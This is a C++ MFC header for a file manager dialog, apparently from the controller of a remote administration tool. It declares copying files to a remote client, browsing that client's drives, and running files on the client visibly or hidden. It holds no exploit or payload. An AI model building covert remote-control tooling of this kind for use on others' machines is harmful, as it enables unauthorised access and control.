#pragma once
#include "afxcmn.h"
#include "IOCPServer.h"
#include "afxwin.h"
#include "TrueColorToolBar.h"

// CFileManagerDlg 对话框

typedef struct 
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILE_SIZE;

typedef CList<CString, CString&> ListTemplate;
class CFileManagerDlg : public CDialog
{
	DECLARE_DYNAMIC(CFileManagerDlg)

public:
	CFileManagerDlg(CWnd* pParent = NULL, IOCPServer* IOCPServer = NULL, CONTEXT_OBJECT *ContextObject = NULL);   // 标准构造函数
	virtual ~CFileManagerDlg();

	VOID CFileManagerDlg::FixedClientDiskDriverList();
	VOID CFileManagerDlg::FixedServerDiskDriverList();

	CONTEXT_OBJECT* m_ContextObject;
	IOCPServer*     m_iocpServer;
	CString         m_strClientIP;
	BYTE	        m_szClientDiskDriverList[0x1000];
	char            m_szServerDiskDriverList[0x1000];

	int	GetServerIconIndex(LPCTSTR szVolume, DWORD dwFileAttributes)
	{
		SHFILEINFO	sfi;
		if (dwFileAttributes == INVALID_FILE_ATTRIBUTES)
			dwFileAttributes = FILE_ATTRIBUTE_NORMAL;
		else
			dwFileAttributes |= FILE_ATTRIBUTE_NORMAL;  

		SHGetFileInfo
			(
			szVolume,
			dwFileAttributes, 
			&sfi,
			sizeof(SHFILEINFO), 
			SHGFI_SYSICONINDEX | SHGFI_USEFILEATTRIBUTES
			);

		return sfi.iIcon;
	}

	CString CFileManagerDlg::GetParentDirectory(CString strPath)
	{
		CString	strCurrentPath = strPath;
		int iIndex = strCurrentPath.ReverseFind('\\');
		if (iIndex == -1)
		{
			return strCurrentPath;
		}
		CString strCurrentSubPath = strCurrentPath.Left(iIndex);  
		iIndex = strCurrentSubPath.ReverseFind('\\');     
		if (iIndex == -1)
		{
			strCurrentPath = "";
			return strCurrentPath;
		}
		strCurrentPath = strCurrentSubPath.Left(iIndex);     

		if(strCurrentPath.Right(1) != "\\")
			strCurrentPath += "\\";
		return strCurrentPath;    
	}

	void CFileManagerDlg::EnableControl(BOOL bEnable)
	{
		m_ControlList_Client.EnableWindow(bEnable);
		m_ControlList_Server.EnableWindow(bEnable);
		m_ComboBox_Server.EnableWindow(bEnable);
		m_ComboBox_Client.EnableWindow(bEnable);
	}

	CTrueColorToolBar m_ToolBar_File_Server; //两个工具栏
	//	CTrueColorToolBar m_wndToolBar_Remote;

	// 对话框数据
	enum { IDD = IDD_DIALOG_FILE_MANAGER };

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	DECLARE_MESSAGE_MAP()
public:
	CListCtrl m_ControlList_Client;
	CListCtrl m_ControlList_Server;

	CImageList* m_ImageList_Large;
	CImageList* m_ImageList_Small;
	afx_msg void OnClose();
	virtual BOOL OnInitDialog();
	afx_msg void OnNMDblclkListServer(NMHDR *pNMHDR, LRESULT *pResult);
	VOID CFileManagerDlg::FixedServerFileList(CString strDirectory="");
	VOID CFileManagerDlg::FixedClientFileList(BYTE *szBuffer, ULONG ulLength);

	CString m_Server_File_Path;
	CString m_Client_File_Path;
	CComboBox m_ComboBox_Server;
	CComboBox m_ComboBox_Client;
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	afx_msg void OnCbnSelchangeComboServer();
	afx_msg void OnCbnDblclkComboServer();
	CStatic m_FileServerBarPos;
	CStatic m_FileClientBarPos;

	afx_msg void OnIdtServerPrev();
	afx_msg void OnIdtServerNewFolder();
	afx_msg void OnIdtServerDelete();
	afx_msg void OnIdtServerStop();
	BOOL  m_bIsStop;
	BOOL CFileManagerDlg::MakeSureDirectoryPathExists(char* szDirectoryFullPath);
	BOOL CFileManagerDlg::DeleteDirectory(LPCTSTR strDirectoryFullPath)   ;
	afx_msg void OnViewBigIcon();
	afx_msg void OnViewSmallIcon();
	afx_msg void OnViewDetail();
	afx_msg void OnViewList();
	afx_msg void OnNMDblclkListClient(NMHDR *pNMHDR, LRESULT *pResult);
	VOID CFileManagerDlg::GetClientFileList(CString strDirectory="");
	VOID CFileManagerDlg::OnReceiveComplete();
	afx_msg void OnLvnBegindragListServer(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnMouseMove(UINT nFlags, CPoint point);

	BOOL  m_bDragging;
	afx_msg void OnLButtonUp(UINT nFlags, CPoint point);
	VOID CFileManagerDlg::DropItemOnList();

	CListCtrl* m_DragControlList;
	CListCtrl* m_DropControlList;

	HCURSOR    m_hCursor;

	ListTemplate   m_Remote_Upload_Job;
	VOID CFileManagerDlg::OnCopyServerToClient();
	BOOL CFileManagerDlg::SendToClientJob();

	CString  m_strSourFileFullPath;
	CString  m_strDestFileFullPath;
	__int64  m_OperatingFileLength;   // 当前操作文件总大小
	VOID CFileManagerDlg::SendFileData();
	__int64  m_ulCounter;
	VOID CFileManagerDlg::EndCopyServerToClient();

	BOOL CFileManagerDlg::FixedServerToClientDirectory(LPCTSTR szDircetoryFullPath)   ;

	CStatusBar     m_StatusBar; // 带进度条的状态栏
	CProgressCtrl* m_ProgressCtrl;

	void CFileManagerDlg::ShowProgress()
	{
		if ((int)m_ulCounter == -1)
		{
			m_ulCounter = m_OperatingFileLength;
		}

		int	iProgress = (float)(m_ulCounter * 100) / m_OperatingFileLength;
		m_ProgressCtrl->SetPos(iProgress);


		if (m_ulCounter == m_OperatingFileLength)
		{
			m_ulCounter = m_OperatingFileLength = 0;
		}
	}

	VOID CFileManagerDlg::SendTransferMode();	

	ULONG  m_ulTransferMode;

	afx_msg void OnNMRClickListServer(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnOperationServerRun();
	afx_msg void OnOperationRename();
	afx_msg void OnLvnEndlabeleditListServer(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnNMRClickListClient(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnOperationClientShowRun();
	afx_msg void OnOperationClientHideRun();
	afx_msg void OnLvnEndlabeleditListClient(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnOperationCompress();

	VOID  CFileManagerDlg::ServerCompress(ULONG ulType);
	BOOL  CFileManagerDlg::CompressFiles(PCSTR strRARFileFullPath,PSTR strString,ULONG ulType);
};
